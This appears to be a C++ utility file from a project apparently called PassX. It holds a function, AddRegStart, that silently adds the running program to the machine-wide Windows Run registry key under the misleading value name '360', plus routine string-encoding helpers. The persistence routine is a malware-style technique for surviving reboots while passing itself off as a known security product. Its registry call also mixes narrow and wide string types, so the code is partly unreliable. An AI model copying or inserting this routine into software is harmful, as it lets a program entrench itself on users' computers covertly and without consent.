#include "PassX.h"
#include "Utils.h"

BOOLEAN AddRegStart()
{
	HKEY hRoot = HKEY_LOCAL_MACHINE;
	CHAR wModule[MAX_PATH];
	WCHAR *wSubKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hKey;
	DWORD dwDisposition = REG_OPENED_EXISTING_KEY;
	LONG lRet = ::RegCreateKeyEx(
		hRoot,
		wSubKey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition);
	if (lRet != ERROR_SUCCESS)
	{
		return FALSE;
	}
	RtlZeroMemory(wModule,sizeof(CHAR) * MAX_PATH);
	::GetModuleFileNameA(NULL,wModule,MAX_PATH);
	lRet = ::RegSetValueEx(hKey,L"360",0,REG_SZ,(BYTE*)wModule,strlen(wModule));
	if (lRet == ERROR_SUCCESS)
	{
		printf("Run Set Over\r\n");
	}
	::RegCloseKey(hKey);
	return TRUE;
}
LPWSTR UTF8_2_UTF16(LPSTR strSource)
{
	DWORD dwLen;
	LPWSTR strDest;

	if ((dwLen = MultiByteToWideChar(CP_UTF8,0,strSource,-1,NULL,0)) == 0)
	{
		return NULL;
	}

	if (!(strDest = (WCHAR *)LocalAlloc(LPTR,dwLen * sizeof(WCHAR))))
	{
		return NULL;
	}
	if (MultiByteToWideChar(CP_UTF8,0,strSource,-1,strDest,dwLen) == 0)
	{
		LocalFree(strDest);
		return NULL;
	}
	return strDest;
}
LPSTR UnicodeToANSI(LPWSTR str)
{
	DWORD dwLen;
	LPSTR strDest;
	// wide char to multi char
	dwLen = WideCharToMultiByte(CP_ACP,
		0,
		str,
		-1,
		NULL,
		0,
		NULL,
		NULL);
	strDest = (LPSTR)LocalAlloc(LPTR,dwLen);
	::WideCharToMultiByte(CP_ACP,
		0,
		str,
		-1,
		strDest,
		dwLen,
		NULL,
		NULL );
	return strDest;
}